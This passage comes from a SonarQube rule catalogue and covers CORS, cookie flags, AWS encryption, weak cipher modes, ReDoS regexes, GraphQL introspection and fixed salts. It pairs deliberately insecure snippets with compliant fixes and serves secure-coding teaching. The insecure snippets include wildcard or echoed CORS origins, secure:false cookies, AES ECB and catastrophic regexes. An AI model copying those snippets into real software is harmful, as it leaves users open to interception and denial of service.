<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>
<pre>
import { Queue } from 'aws-cdk-lib/aws-sqs';

new Queue(this, 'example'); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>
<pre>
import { CfnQueue } from 'aws-cdk-lib/aws-sqs';

new CfnQueue(this, 'example'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>
<pre>
import { Queue } from 'aws-cdk-lib/aws-sqs';

new Queue(this, 'example', {
    encryption: QueueEncryption.KMS_MANAGED
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>
<pre>
import { CfnQueue } from 'aws-cdk-lib/aws-sqs';

const encryptionKey = new Key(this, 'example', {
    enableKeyRotation: true,
});

new CfnQueue(this, 'example', {
    kmsMasterKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html">AWS Documentation</a> -
  Encryption at rest </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5122">
              javascript:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269">CVE-2018-0269</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460">CVE-2017-14460</a> </li>
</ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>
  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>
  <li> Your access control policy is dynamically defined by a user-controlled input like <a
  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code>origin</code></a> header. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>
  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://nodejs.org/api/http.html">nodejs http</a> built-in module:</p>
<pre>
const http = require('http');
const srv = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); // Sensitive
  res.end('ok');
});
srv.listen(3000);
</pre>
<p><a href="https://www.npmjs.com/package/express">Express.js</a> framework with <a href="https://www.npmjs.com/package/cors">cors middleware</a>:</p>
<pre>
const cors = require('cors');

let app1 = express();
app1.use(cors()); // Sensitive: by default origin is set to *

let corsOptions = {
  origin: '*' // Sensitive
};

let app2 = express();
app2.use(cors(corsOptions));
</pre>
<p>User-controlled origin:</p>
<pre>
function (req, res) {
  const origin = req.header('Origin');
  res.setHeader('Access-Control-Allow-Origin', origin); // Sensitive
};
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://nodejs.org/api/http.html">nodejs http</a> built-in module:</p>
<pre>
const http = require('http');
const srv = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Access-Control-Allow-Origin': 'trustedwebsite.com' }); // Compliant
  res.end('ok');
});
srv.listen(3000);
</pre>
<p><a href="https://www.npmjs.com/package/express">Express.js</a> framework with <a href="https://www.npmjs.com/package/cors">cors middleware</a>:</p>
<pre>
const cors = require('cors');

let corsOptions = {
  origin: 'trustedwebsite.com' // Compliant
};

let app = express();
app.use(cors(corsOptions));
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
function (req, res) {
  const origin = req.header('Origin');

  if (trustedOrigins.indexOf(origin) &gt;= 0) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
};
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org</a> - CORS </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org</a> - Same origin policy </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/346">CWE-346 - Origin Validation Error</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/942">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6332">
              javascript:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The file system contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html"><code>aws_cdk.aws_efs.FileSystem</code></a></p>
<pre>
import { FileSystem } from 'aws-cdk-lib/aws-efs';

new FileSystem(this, 'unencrypted-explicit', {
    vpc: new Vpc(this, 'VPC'),
    encrypted: false // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>
<pre>
import { CfnFileSystem } from 'aws-cdk-lib/aws-efs';

new CfnFileSystem(this, 'unencrypted-implicit-cfn', {
}); // Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html"><code>aws_cdk.aws_efs.FileSystem</code></a></p>
<pre>
import { FileSystem } from 'aws-cdk-lib/aws-efs';

new FileSystem(this, 'encrypted-explicit', {
    vpc: new Vpc(this, 'VPC'),
    encrypted: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>
<pre>
import { CfnFileSystem } from 'aws-cdk-lib/aws-efs';

new CfnFileSystem(this, 'encrypted-explicit-cfn', {
    encrypted: true
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html">AWS Documentation</a> - Data encryption in Amazon EFS </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2092">
              javascript:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>
  <li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">mixed content</a> or not
  (ie HTTPS everywhere or not) </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li>
  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/cookie-session">cookie-session</a> module:</p>
<pre>
let session = cookieSession({
  secure: false,// Sensitive
});  // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/express-session">express-session</a> module:</p>
<pre>
const express = require('express');
const session = require('express-session');

let app = express();
app.use(session({
  cookie:
  {
    secure: false // Sensitive
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies">cookies</a> module:</p>
<pre>
let cookies = new Cookies(req, res, { keys: keys });

cookies.set('LastVisit', new Date().toISOString(), {
  secure: false // Sensitive
}); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/csurf">csurf</a> module:</p>
<pre>
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const express = require('express');

let csrfProtection = csrf({ cookie: { secure: false }}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/cookie-session">cookie-session</a> module:</p>
<pre>
let session = cookieSession({
  secure: true,// Compliant
});  // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/express-session">express-session</a> module:</p>
<pre>
const express = require('express');
const session = require('express-session');

let app = express();
app.use(session({
  cookie:
  {
    secure: true // Compliant
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies">cookies</a> module:</p>
<pre>
let cookies = new Cookies(req, res, { keys: keys });

cookies.set('LastVisit', new Date().toISOString(), {
  secure: true // Compliant
}); // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/csurf">csurf</a> module:</p>
<pre>
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const express = require('express');

let csrfProtection = csrf({ cookie: { secure: true }}); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/614">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5542">
              python:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in PyCrypto</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
from Crypto.Cipher import AES

AES.new(key, AES.MODE_ECB) # Noncompliant
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
from Crypto.Cipher import PKCS1_v1_5

PKCS1_v1_5.new(key) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Since PyCrypto is not supported anymore, another library should be used. In the current context, Cryptodome uses a similar API.</p>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="11" data-diff-type="compliant">
from Crypto.Cipher import AES

AES.new(key, AES.MODE_GCM)
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="12" data-diff-type="compliant">
from Crypto.Cipher import PKCS1_OAEP

PKCS1_OAEP.new(key)
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4784">
              python:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=python%3AS5852&rule_key=python%3AS5852'>S5852</a>, <a href='/organizations/sopra-steria/rules?open=pythonsecurity%3AS2631&rule_key=pythonsecurity%3AS2631'>S2631</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021">CVE-2017-16021</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863">CVE-2018-13863</a> </li>
</ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a
href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*+{</code>.</p>
<p>Example: <code>(a+)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<p>Django</p>
<pre>
from django.core.validators import RegexValidator
from django.urls import re_path

RegexValidator('(a*)*b')  # Sensitive

def define_http_endpoint(view):
    re_path(r'^(a*)*b/$', view)  # Sensitive
</pre>
<p><code>re</code> module</p>
<pre>
import re
from re import compile, match, search, fullmatch, split, findall, finditer, sub, subn


input = 'input string'
replacement = 'replacement'

re.compile('(a*)*b')  # Sensitive
re.match('(a*)*b', input)  # Sensitive
re.search('(a*)*b', input)  # Sensitive
re.fullmatch('(a*)*b', input)  # Sensitive
re.split('(a*)*b', input)  # Sensitive
re.findall('(a*)*b', input)  # Sensitive
re.finditer('(a*)*b',input)  # Sensitive
re.sub('(a*)*b', replacement, input)  # Sensitive
re.subn('(a*)*b', replacement, input)  # Sensitive
</pre>
<p><code>regex</code> module</p>
<pre>
import regex
from regex import compile, match, search, fullmatch, split, findall, finditer, sub, subn, subf, subfn, splititer

input = 'input string'
replacement = 'replacement'

regex.subf('(a*)*b', replacement, input)  # Sensitive
regex.subfn('(a*)*b', replacement, input)  # Sensitive
regex.splititer('(a*)*b', input)  # Sensitive

regex.compile('(a*)*b')  # Sensitive
regex.match('(a*)*b', input)  # Sensitive
regex.search('(a*)*b', input)  # Sensitive
regex.fullmatch('(a*)*b', input)  # Sensitive
regex.split('(a*)*b', input)  # Sensitive
regex.findall('(a*)*b', input)  # Sensitive
regex.finditer('(a*)*b',input)  # Sensitive
regex.sub('(a*)*b', replacement, input)  # Sensitive
regex.subn('(a*)*b', replacement, input)  # Sensitive
</pre>
<h2>Exceptions</h2>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,
<code>(a|a?)+</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a "<code>|</code>".</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">CWE-624 - Executable Regular Expression
  Error</a> </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6786">
              python:S6786
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes information about all the APIs available on a GraphQL API server. This information can be used to discover weaknesses in
the API that can be exploited.</p>
<h2>Why is this an issue?</h2>
<p>GraphQL introspection is a feature that allows client applications to query the schema of a GraphQL API at runtime. It provides a way for
developers to explore and understand the available data and operations supported by the API.</p>
<p>This feature is a diagnostic tool that should only be used in the development phase as its presence also creates risks.</p>
<p>Clear documentation and API references should be considered better discoverability tools for a public GraphQL API.</p>
<h3>What is the potential impact?</h3>
<p>An attacker can use introspection to identify all of the operations and data types supported by the server. This information can then be used to
identify potential targets for attacks.</p>
<h4>Exploitation of private APIs</h4>
<p>Even when a GraphQL API server is open to access by third-party applications, it may contain APIs that are intended only for private use.
Introspection allows these private APIs to be discovered.</p>
<p>Private APIs often do not receive the same level of security rigor as public APIs. For example, they may skip input validation because the API is
only expected to be called from trusted applications. This can create avenues for attack that are not present on public APIs.</p>
<h4>Exposure of sensitive data</h4>
<p>GraphQL allows for multiple related objects to be retrieved using a single API call. This provides an efficient method of obtaining data for use in
a client application.</p>
<p>An attacker may be able to use these relationships between objects to traverse the data structure. They may be able to find a link to sensitive
data that the developer did not intentionally make available.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from graphql_server.flask import GraphQLView

app.add_url_rule("/api",
    view_func=GraphQLView.as_view(  # Noncompliant
        name="api",
        schema=schema,
    )
)
</pre>
<h4>Compliant solution</h4>
<p>Make sure that introspection is disabled in production environments. You can use the following code sample as a reference, in conjunction with your
own methods for distinguishing between production and non-production environments.</p>
<pre data-diff-id="1" data-diff-type="compliant">
from graphql_server.flask import GraphQLView

# Only one of the following needs to be used
from graphql.validation import NoSchemaIntrospectionCustomRule # graphql-core v3
from graphene.validation import DisableIntrospection           # graphene v3


app.add_url_rule("/api",
    view_func=GraphQLView.as_view(
        name="api",
        schema=schema,
        validation_rules=[
            NoSchemaIntrospectionCustomRule,
            DisableIntrospection,
        ]
    )
)
</pre>
<h3>How does this work?</h3>
<h4>Disabling introspection</h4>
<p>The GraphQL server framework should be instructed to disable introspection in production environments. This prevents any attacker attempt to
retrieve schema information from the server at runtime.</p>
<p>Each GraphQL framework will have a different method of doing this, possibly including:</p>
<ul>
  <li> Changing a simple boolean setting. </li>
  <li> Adding a middleware module to the request processing chain. </li>
  <li> Adding a GraphQL validator that rejects introspection keywords. </li>
</ul>
<p>If introspection is required, it should only be made available to the smallest possible audience. This could include development environments,
users with a specific right, or requests from a specific set of IP addresses.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> OWASP Web Security Testing Guide - <a
  href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL#introspection-queries">Testing GraphQL</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2053">
              python:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a "salt," is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h3>Exceptions</h3>
<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such
functions are:</p>
<ul>
  <li> Argon2 </li>
  <li> PBKDF2 </li>
  <li> Scrypt </li>
  <li> Bcrypt </li>
</ul>
<p>When they are used for password storage, using a secure, random salt is required.</p>
<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those
cases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed
salt is safe and accepted.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import hashlib

hash = hashlib.scrypt(password, salt=b"F3MdWpeHeeSjlUxvKBnzzA", n=2**17, r=8, p=1) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import hashlib
import secrets

salt = secrets.token_bytes(32)
hash = hashlib.scrypt(password, salt=salt, n=2**17, r=8, p=1)
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>
<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>secrets.token_bytes</code> function.
This one internally uses a cryptographically secure pseudo random number generator.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
